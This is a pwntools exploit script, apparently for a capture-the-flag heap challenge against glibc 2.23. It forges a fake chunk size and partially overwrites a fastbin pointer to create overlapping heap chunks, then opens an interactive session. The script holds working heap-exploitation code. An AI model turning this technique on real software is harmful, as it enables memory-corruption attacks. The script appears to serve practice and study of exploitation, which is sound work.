from pwn import *

elf = ELF("./pwn2.23")
libc = ELF("/home/zsy/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context(arch=elf.arch, os=elf.os)
context.log_level = "debug"
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter("choice:", "1")
    p.sendafter("index:", str(index))
    p.sendafter("size:", str(size))


def delete_chunk(index):
    p.sendafter("choice:", "2")
    p.sendafter("index:", str(index))


def edit_chunk(index, content):
    p.sendafter("choice:", "3")
    p.sendafter("index:", str(index))
    p.sendafter("length:", str(len(content)))
    p.sendafter("content:", content)


def show_chunk(index):
    p.sendafter("choice:", "4")
    p.sendafter("index:", str(index))


gdb.attach(p)

add_chunk(10, 0x80)
add_chunk(0, 0x70)
add_chunk(1, 0x50)
add_chunk(2, 0x70)

# fake_chunk->size = 0x81
edit_chunk(0, b"a" * 0x60 + p64(0) + p64(0x81))

# free to fastbin
delete_chunk(2)
delete_chunk(0)
# BYTE0(chunk[0]->fd) = 0x0
edit_chunk(0, p8(0))

add_chunk(0, 0x70)
# overlap
add_chunk(0, 0x70)

delete_chunk(2)

p.interactive()
